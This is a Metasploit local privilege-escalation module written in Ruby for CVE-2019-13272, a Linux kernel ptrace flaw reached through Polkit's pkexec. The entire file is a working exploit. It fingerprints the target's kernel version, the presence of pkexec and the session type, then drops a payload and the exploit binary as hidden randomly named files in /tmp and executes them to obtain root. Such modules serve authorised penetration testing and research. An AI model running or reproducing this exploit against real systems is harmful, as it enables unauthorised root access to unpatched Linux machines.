# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Linux Polkit pkexec helper PTRACE_TRACEME local root exploit&#039;,
      &#039;Description&#039;   => %q{
          This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux
          kernel 5.1.17. This issue can be exploited from a Linux desktop terminal, but
          not over an SSH session, as it requires execution from within the context of
          a user with an active Polkit agent.
          In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles
          the recording of the credentials of a process that wants to create a ptrace
          relationship, which allows local users to obtain root access by leveraging
          certain scenarios with a parent-child process relationship, where a parent drops
          privileges and calls execve (potentially allowing control by an attacker). One
          contributing factor is an object lifetime issue (which can also cause a panic).
          Another contributing factor is incorrect marking of a ptrace relationship as
          privileged, which is exploitable through (for example) Polkit&#039;s pkexec helper
          with PTRACE_TRACEME.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
          &#039;Jann Horn&#039;,    # Discovery and exploit
          &#039;bcoles&#039;,       # Metasploit module
          &#039;timwr&#039;,        # Metasploit module
      ],
      &#039;References&#039;     => [
          [&#039;CVE&#039;, &#039;2019-13272&#039;],
          [&#039;EDB&#039;, &#039;47133&#039;],
          [&#039;PACKETSTORM&#039;, &#039;153663&#039;],
          [&#039;URL&#039;, &#039;https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272&#039;],
          [&#039;URL&#039;, &#039;https://bugs.chromium.org/p/project-zero/issues/detail?id=1903&#039;],
      ],
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PrependFork&#039; => true,
        },
      &#039;DisclosureDate&#039; => &#039;Jul 4 2019&#039;))
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ]
  end

  def check
    # Introduced in 4.10, but also backported
    # Patched in 4.4.185, 4.9.185, 4.14.133, 4.19.58, 5.1.17
    release = kernel_release
    v = Gem::Version.new release.split(&#039;-&#039;).first

    if v >= Gem::Version.new(&#039;5.1.17&#039;) || v < Gem::Version.new(&#039;3&#039;)
      vprint_error "Kernel version #{release} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Kernel version #{release} appears to be vulnerable"

    unless command_exists? &#039;pkexec&#039;
      vprint_error &#039;pkexec is not installed&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;pkexec is installed&#039;

    arch = kernel_hardware
    unless arch.include? &#039;x86_64&#039;
      vprint_error "System architecture #{arch} is not supported"
      return CheckCode::Safe
    end
    vprint_good "System architecture #{arch} is supported"

    loginctl_output = cmd_exec(&#039;loginctl --no-ask-password show-session "$XDG_SESSION_ID" | grep Remote&#039;)
    if loginctl_output =~ /Remote=yes/
      print_warning &#039;This is exploit requires a valid policykit session (it cannot be executed over ssh)&#039;
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def exploit
    if is_root? && !datastore[&#039;ForceExploit&#039;]
      fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
    end

    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    unless writable? datastore[&#039;WritableDir&#039;]
      fail_with Failure::BadConfig, "#{datastore[&#039;WritableDir&#039;]} is not writable"
    end

    payload_file = "#{datastore[&#039;WritableDir&#039;]}/.#{Rex::Text.rand_text_alpha_lower(6..12)}"
    upload_and_chmodx(payload_file, generate_payload_exe)
    register_file_for_cleanup(payload_file)

    exploit_file = "#{datastore[&#039;WritableDir&#039;]}/.#{Rex::Text.rand_text_alpha_lower(6..12)}"
    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;
      upload_and_compile exploit_file, exploit_data(&#039;CVE-2019-13272&#039;, &#039;poc.c&#039;)
    else
      upload_and_chmodx exploit_file, exploit_data(&#039;CVE-2019-13272&#039;, &#039;exploit&#039;)
    end
    register_file_for_cleanup(exploit_file)

    print_status("Executing exploit &#039;#{exploit_file}&#039;")
    result = cmd_exec("echo #{payload_file} | #{exploit_file}")
    print_status("Exploit result:\n#{result}")
  end
end

